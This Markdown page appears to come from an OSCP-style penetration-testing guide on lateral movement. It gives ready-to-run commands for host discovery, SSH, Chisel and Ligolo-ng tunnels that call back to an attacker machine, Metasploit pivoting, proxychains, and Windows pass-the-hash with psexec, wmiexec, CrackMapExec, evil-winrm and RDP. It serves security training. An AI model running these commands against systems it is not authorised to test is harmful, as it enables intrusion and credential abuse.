# 🔄 Phase 9 — Lateral Movement

> **Moving from one compromised system to others on the network.** Used when you need access to other machines or internal services.

---

## Table of Contents
- [When to Pivot](#when-to-pivot)
- [SSH Tunneling](#ssh-tunneling)
- [Chisel Tunneling](#chisel-tunneling)
- [Ligolo-ng (Best for OSCP)](#ligolo-ng-best-for-oscp)
- [Metasploit Pivoting](#metasploit-pivoting)
- [Proxychains](#proxychains)
- [Windows Lateral Movement](#windows-lateral-movement)

---

## When to Pivot

You need to pivot when:
- You find an internal IP range in `ip a` / `ipconfig` that you can't reach directly
- You discover internal services (e.g., a web server on `127.0.0.1:8080` or `10.10.10.x:3306`)
- You need to move to another machine in the network

```bash
# Find other reachable hosts from compromised machine
ip route            # What networks can this machine reach?
arp -a              # What hosts has it recently talked to?
cat /etc/hosts      # Any known internal hostnames?
for i in $(seq 1 254); do ping -c 1 -W 1 10.10.10.$i > /dev/null 2>&1 && echo "10.10.10.$i is up"; done
```

---

## SSH Tunneling

### Local Port Forwarding

Forward a remote port to your local machine:

```bash
# Access target's port 80 on your local port 8080
ssh -L 8080:127.0.0.1:80 user@$IP

# Access an internal host through the pivot
ssh -L 8080:<internal_host>:<internal_port> user@$pivot_IP

# Example: access internal web server at 10.10.10.5:80
ssh -L 8080:10.10.10.5:80 user@$IP
# Then browse: http://127.0.0.1:8080
```

### Dynamic Port Forwarding (SOCKS Proxy)

Route ALL traffic through the pivot:

```bash
ssh -D 9050 user@$IP   # SOCKS5 proxy on port 9050
# Then configure proxychains to use 127.0.0.1:9050
proxychains nmap -sT 10.10.10.0/24
```

### Remote Port Forwarding

Expose your local port through the remote machine:

```bash
# Make your listener (attacker:4444) accessible from remote machine
ssh -R 4444:127.0.0.1:4444 user@$IP
# Now reverse shells on the pivot can connect to your listener
```

### SSH with ProxyJump (Multi-Hop)

```bash
ssh -J user@$pivot user2@<internal_host>
```

---

## Chisel Tunneling

Chisel works over HTTP — great for bypassing firewalls. Works on Linux and Windows.

- [ ] **Setup (attacker machine as server)**:
  ```bash
  ./chisel server -p 8080 --reverse
  ```
- [ ] **Connect from target (SOCKS proxy — all traffic)**:
  ```bash
  # Linux target
  ./chisel client <attacker_ip>:8080 R:socks
  
  # Windows target
  .\chisel.exe client <attacker_ip>:8080 R:socks
  ```
  Now configure proxychains to use SOCKS5 on `127.0.0.1:1080`

- [ ] **Forward specific port only**:
  ```bash
  # Forward target's port 3306 to attacker's port 3306
  ./chisel client <attacker_ip>:8080 R:3306:127.0.0.1:3306
  ```
- [ ] **Download Chisel**: [https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)

---

## Ligolo-ng (Best for OSCP)

Ligolo-ng is the most flexible pivoting tool — runs as a reverse tunnel and creates a tun interface. Full routing, no proxychains needed.

- [ ] **Setup (attacker machine)**:
  ```bash
  # Start proxy
  sudo ./ligolo-ng-proxy -selfcert
  # Opens on port 11601 by default
  ```
- [ ] **Connect from target**:
  ```bash
  # Linux
  ./ligolo-ng-agent -connect <attacker_ip>:11601 -ignore-cert
  
  # Windows
  .\ligolo-ng-agent.exe -connect <attacker_ip>:11601 -ignore-cert
  ```
- [ ] **Configure in ligolo-ng proxy console**:
  ```
  session              # List available sessions
  1                    # Select session
  ifconfig             # View target's network interfaces
  start                # Start tunneling
  ```
- [ ] **Add route on attacker**:
  ```bash
  sudo ip route add <target_subnet>/24 dev ligolo
  # Now you can directly reach internal hosts!
  nmap -sT 10.10.10.0/24   # No proxychains needed
  ```
- [ ] **Download**: [https://github.com/nicocha30/ligolo-ng/releases](https://github.com/nicocha30/ligolo-ng/releases)

> **💡 Tip:** Ligolo-ng is the preferred tool for OSCP pivoting because it gives you real routing — your tools work normally without proxychains overhead.

---

## Metasploit Pivoting

When you have a Meterpreter session:

- [ ] **Add route through session**:
  ```bash
  use post/multi/manage/autoroute
  set SESSION <session_id>
  set SUBNET <target_subnet>
  run
  # Or in meterpreter:
  run autoroute -s <subnet>
  run autoroute -p      # Print routes
  ```
- [ ] **Port forwarding via Meterpreter**:
  ```bash
  portfwd add -l <local_port> -p <remote_port> -r <remote_host>
  portfwd add -l 3389 -p 3389 -r <internal_host>
  ```
- [ ] **SOCKS proxy via Metasploit**:
  ```bash
  use auxiliary/server/socks_proxy
  set VERSION 5
  set SRVPORT 9050
  run -j
  # Configure proxychains → 127.0.0.1:9050
  ```

---

## Proxychains

Configure proxychains to route traffic through your tunnel:

- [ ] **Edit proxychains config**:
  ```bash
  sudo nano /etc/proxychains4.conf
  # Add/modify last line:
  socks5 127.0.0.1 1080    # For Chisel
  socks5 127.0.0.1 9050    # For SSH dynamic or Metasploit
  ```
- [ ] **Use proxychains**:
  ```bash
  proxychains nmap -sT -Pn <internal_ip>    # TCP connect (no SYN scan through proxy)
  proxychains nmap -sV -p 80,443,22 <internal_ip>
  proxychains crackmapexec smb <internal_ip>
  proxychains evil-winrm -i <internal_ip> -u <user> -p <pass>
  proxychains ssh user@<internal_ip>
  proxychains python3 secretsdump.py ...
  ```
> **⚠️ Important:** Through proxychains you can only do **TCP connect** scans (no `-sS` SYN scans). Use `-sT` flag with nmap.

---

## Windows Lateral Movement

### Pass-the-Hash (WMI/SMB)

```bash
# psexec
python3 psexec.py -hashes :<ntlm_hash> <domain>/<user>@<target>

# wmiexec (less noisy)
python3 wmiexec.py -hashes :<ntlm_hash> <domain>/<user>@<target>

# CrackMapExec
crackmapexec smb <target> -u <user> -H <ntlm_hash> -x "whoami"
```

### WinRM / evil-winrm

```bash
evil-winrm -i <target> -u <user> -p '<pass>'
evil-winrm -i <target> -u <user> -H '<ntlm_hash>'
```

### RDP

```bash
xfreerdp /v:<target> /u:<user> /p:<pass> /cert-ignore
xfreerdp /v:<target> /u:<user> /pth:<ntlm_hash> /cert-ignore
```

### PowerShell Remoting

```powershell
# Create credential
$cred = New-Object System.Management.Automation.PSCredential("<domain>\<user>", (ConvertTo-SecureString "<pass>" -AsPlainText -Force))

# Enter remote session
Enter-PSSession -ComputerName <target> -Credential $cred

# Run command remotely
Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock {whoami}
```

### SMB with Credentials

```bash
smbclient //<target>/C$ -U '<user>%<pass>'
smbclient //<target>/C$ -U '<domain>/<user>%<pass>'
```

---

## 🔗 References

- [Chisel GitHub](https://github.com/jpillora/chisel)
- [Ligolo-ng GitHub](https://github.com/nicocha30/ligolo-ng)
- [HackTricks — Pivoting](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
- [Proxychains Setup Guide](https://github.com/haad/proxychains)

---

*[← Active Directory](../08_active_directory/README.md) · [Back to Main](../README.md) · [Persistence →](../10_persistence/README.md)*
